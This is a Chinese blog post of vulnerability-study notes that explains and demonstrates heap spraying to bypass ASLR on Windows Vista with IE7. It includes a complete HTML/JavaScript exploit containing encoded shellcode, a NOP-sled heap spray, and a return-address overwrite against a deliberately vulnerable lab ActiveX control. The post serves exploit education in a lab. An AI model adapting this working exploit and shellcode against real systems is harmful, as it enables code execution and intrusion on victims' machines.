---
title: 漏洞学习笔记-019-利用HeapSpray攻击ASLR
description: 利用Heap Spray(堆喷射)技术来攻击ASLR并定位shellcode
date: 2020-11-28 12:38:00+0800
categories:
    - Exploit
tags:
    - Windows
    - Exploit
---

本文来源：[Moeomu的博客](/zh-cn/posts/漏洞学习笔记-019-利用heapspray攻击aslr/)

## 原理

通过申请大量的内存，占领内存中的0x0C0C0C0C的位置，并在这些内存中放置0x90和shellcode，最后控制程序转入0x0C0C0C0C执行。只要运气不要差到0x0C0C0C0C刚好位于shellcode中的某个位置，shellcode就可以成功执行

## 实验

### 准备工作

> 环境：系统：Windows Vista SP0，DEP状态：默认，浏览器：IE7

- 还是将之前用过的[Vulner_AX.dll](https://pan.moeomu.com/Tutorial/0Day安全-资料/VulnerAX_SEH/VulnerAX.ocx)作为攻击目标
- `VulnerAX.idl`中`CVulnerAXCtrl的类信息`的UUID：`ACA3927C-6BD1-4B4E-8697-72481279AAEC`

### 思想

- 我们利用Heap spray技术在内存中申请200个1MB的内存块来对抗ASLR的随机化处理
- 每个内存块中包含着0x90填充和shellcode
- Heap spray结束后我们会占领`0x0C0C0C0C`附近的内存，我们只要控制程序转入`0x0C0C0C0C`执行，在经过若干个0x90滑行之后就可以到达shellcode范围并执行
- test函数中存在一个典型的溢出漏洞，通过复制超长字符串可以覆盖函数返回地址
- 我们将函数返回地址覆盖为`0x0C0C0C0C`，在函数执行返回执行后就会转入我们申请的内存空间中

### 代码

```html
<html>
<body>
<script>
    var nops = unescape("%u9090%u9090");
    var shellcode = "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u616B\u6F6F\u4D68\u7369\u8B61\u53c4\u5050\uff53\ufc57\uff53\uf857";
    while (nops.length < 0x100000)
        nops += nops;
    nops = nops.substring(0, 0x100000/2-32/2-4/2-2/2-shellcode.length);
    nops = nops + shellcode;
    var memory = new Array();
    for (var i = 0; i < 200; i++)
        memory[i] += nops;
</script>
<object classid="clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC" id="test"> </object>
<script>
    var s = "\u9090";
    while (s.length < 54)
    {
        s += "\u9090";
    }
    s += "\u0C0C\u0C0C";
    test.test(s);
</script>
</body>
</html>
```

### 结果

- 成功攻击ASLR，如图

![pic1](https://s3.ax1x.com/2020/11/28/DyUSMR.png)  
![pic2](https://s3.ax1x.com/2020/11/28/DyUcl9.jpg)  
![pic3](https://s3.ax1x.com/2020/11/28/DyN3vR.png)
